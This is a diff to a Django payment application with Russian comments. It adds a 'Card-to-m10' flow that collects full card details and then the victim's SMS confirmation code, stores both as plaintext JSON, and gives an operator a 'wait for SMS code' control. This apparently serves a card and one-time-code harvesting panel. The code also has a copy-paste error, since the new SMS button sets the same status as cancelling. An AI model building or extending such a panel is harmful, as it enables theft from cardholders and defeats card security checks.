@@ -17,8 +17,9 @@ from django.views.generic import CreateView, DetailView, FormView, UpdateView, L
 
 from deposit.models import Incoming
 from payment import forms
-from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm
-from payment.models import Payment, PayRequisite, Shop
+from payment.filters import PaymentFilter
+from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form
+from payment.models import Payment, PayRequisite, Shop, CreditCard
 
 logger = structlog.get_logger(__name__)
 
@@ -26,6 +27,7 @@ logger = structlog.get_logger(__name__)
 def get_pay_requisite(pay_type: str) -> PayRequisite:
     """Выдает реквизиты по типу
     [Card-to-Card]
+    [Card-to-m10]
     """
     active_requsite = PayRequisite.objects.filter(pay_type=pay_type, is_active=True).all()
     logger.debug(f'active_requsite {pay_type}: {active_requsite}')
@@ -35,8 +37,10 @@ def get_pay_requisite(pay_type: str) -> PayRequisite:
         return selected_requisite
 
 
+TIMER_SECONDS = 100
+
+
 def get_time_remaining(pay: Payment) -> datetime.timedelta:
-    TIMER_SECONDS = 100
     time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
     return time_remaining
 
@@ -47,19 +51,28 @@ def get_time_remaining_data(pay: Payment) -> dict:
         hours = time_remaining.seconds // 3600
         minutes = (time_remaining.seconds % 3600) // 60
         seconds = time_remaining.seconds % 60
+
         data = {
             'name': 'Время до оплаты',
             'hours': hours,
             'minutes': minutes,
-            'seconds': seconds
+            'seconds': seconds,
+            'total_seconds': int(time_remaining.total_seconds()),
+            'limit': TIMER_SECONDS,
+            'time_passed': int(TIMER_SECONDS - time_remaining.total_seconds())
         }
     else:
         data = {
             'name': "Время до оплаты",
             'hours': 0,
             'minutes': 0,
-            'seconds': 0
+            'seconds': 0,
+            'total_seconds': 0,
+            'limit': TIMER_SECONDS,
+            'time_passed': TIMER_SECONDS
+
         }
+    print(data)
     return data
 
 
@@ -93,6 +106,8 @@ def invoice(request, *args, **kwargs):
         pay_type = request.GET.get('pay_type')
         if pay_type == 'Card-to-Card':
             return redirect(reverse('payment:pay_to_card_create') + f'?{query_params}')
+        elif pay_type == 'Card-to-m10':
+            return redirect(reverse('payment:pay_to_m10_create') + f'?{query_params}')
     logger.warning('Необработанный путь')
     return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                   content='Not correct data'
@@ -135,6 +150,7 @@ def pay_to_card_create(request, *args, **kwargs):
                 order_id=order_id,
                 user_login=user_login,
                 amount=amount,
+                pay_type=pay_type
             )
             logger.debug(f'payment, status: {payment} {status}')
         except Exception as err:
@@ -158,7 +174,7 @@ def pay_to_card_create(request, *args, **kwargs):
 
         form = forms.InvoiceForm(instance=payment, )
         context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
-        return render(request, context=context, template_name='payment/invoice.html')
+        return render(request, context=context, template_name='payment/invoice_card.html')
 
     elif request.method == 'POST':
         # Обработка нажатия кнопки
@@ -176,7 +192,85 @@ def pay_to_card_create(request, *args, **kwargs):
         else:
             logger.debug(f'{form.errors}')
             context = {'form': form, 'payment': payment, 'status': payment.PAYMENT_STATUS[payment.status]}
-            return render(request, context=context, template_name='payment/invoice.html')
+            return render(request, context=context, template_name='payment/invoice_card.html')
+    logger.critical('Необработанный путь')
+
+
+def pay_to_m10_create(request, *args, **kwargs):
+
+    if request.method == 'GET':
+        shop_id = request.GET.get('shop_id')
+        order_id = request.GET.get('order_id')
+        user_login = request.GET.get('user_login')
+        amount = request.GET.get('amount')
+        pay_type = request.GET.get('pay_type')
+        logger.debug(f'GET {request.GET.dict()} {shop_id} {order_id} {user_login} {amount} {pay_type}'
+                     f' {request.META.get("HTTP_REFERER")}')
+
+        try:
+            payment, status = Payment.objects.get_or_create(
+                shop_id=shop_id,
+                order_id=order_id,
+                user_login=user_login,
+                amount=amount,
+                pay_type=pay_type
+            )
+            logger.debug(f'payment, status: {payment} {status}')
+        except Exception as err:
+            logger.error(err)
+            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
+                                          content='Not correct data')
+        if payment.status not in [0, 3]:
+            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
+
+        requisite = get_pay_requisite(pay_type)
+        # Если нет активных реквизитов
+        if not requisite:
+            # Перенаправляем на извинения
+            return redirect(reverse('payment:payment_type_not_worked'))
+
+        # Сохраняем реквизит к платежу
+        if not payment.pay_requisite:
+            payment.pay_requisite = requisite
+            payment.save()
+
+        initial_data = {'payment_id': payment.id}
+        if payment.card_data:
+            initial_data.update(json.loads(payment.card_data))
+        form = forms.InvoiceM10Form(initial=initial_data)
+        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
+        return render(request, context=context, template_name='payment/invoice_m10.html')
+
+    elif request.method == 'POST':
+        # Обработка нажатия кнопки
+        payment_id = request.POST.get('payment_id')
+        payment = Payment.objects.get(pk=payment_id)
+        form = InvoiceM10Form(request.POST)
+        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
+        if form.is_valid():
+            card_data = form.cleaned_data
+            json_data = json.dumps(card_data, ensure_ascii=False)
+            sms_code = card_data.get('sms_code')
+            payment.card_data = json_data
+            if sms_code:
+                # Если введен смс-код
+                payment.status = 7  # Ожидание подтверждения
+                payment.save()
+                return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
+            # Введены данные карты
+            payment.status = 3  # Ввел CC.
+            payment.save()
+            return render(request, context=context, template_name='payment/invoice_m10.html')
+            # # Сохраняем данные и скриншот, меняем статус
+            # logger.debug('form_save')
+            # payment.status = 1
+            # form.save()
+            # return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
+        else:
+            # Некорректные данные
+            logger.debug(f'{form.errors}')
+            return render(request, context=context, template_name='payment/invoice_m10.html')
+
     logger.critical('Необработанный путь')
 
 
@@ -187,7 +281,7 @@ class PayResultView(DetailView):
 
     def get_context_data(self, **kwargs):
         context = super().get_context_data(**kwargs)
-        context['status'] = self.object.PAYMENT_STATUS[self.object.status][1]
+        context['status'] = self.object.status_str
         data = get_time_remaining_data(self.object)
         data['name'] = 'Время до подтверждения'
         context['data'] = data
@@ -200,6 +294,7 @@ class PaymentListView(ListView):
     model = Payment
     fields = ('confirmed_amount',
               'confirmed_incoming')
+    filter = PaymentFilter
 
     # def get(self, request, *args, **kwargs):
     #     logger.debug('get form', request=request, args=args, kwargs=kwargs)
@@ -210,6 +305,9 @@ class PaymentListView(ListView):
         context = super().get_context_data(**kwargs)
         form = PaymentListConfirmForm()
         context['form'] = form
+        filter = PaymentFilter(self.request.GET, queryset=Payment.objects.all())
+        print(filter)
+        context['filter'] = filter
         return context
 
     def post(self, request, *args, **kwargs):
@@ -222,6 +320,14 @@ class PaymentListView(ListView):
             if 'cancel_payment' in request.POST.keys():
                 payment_id = request.POST['cancel_payment']
                 # Отклонение заявки
+                payment = Payment.objects.get(pk=payment_id)
+                payment.status = -1
+                payment.save()
+                return redirect(reverse('payment:payment_list'))
+
+            if 'wait_sms_code' in request.POST.keys():
+                payment_id = request.POST['wait_sms_code']
+                # Готовность приема кода
                 payment = Payment.objects.get(pk=payment_id)
                 payment.status = -1
                 payment.save()
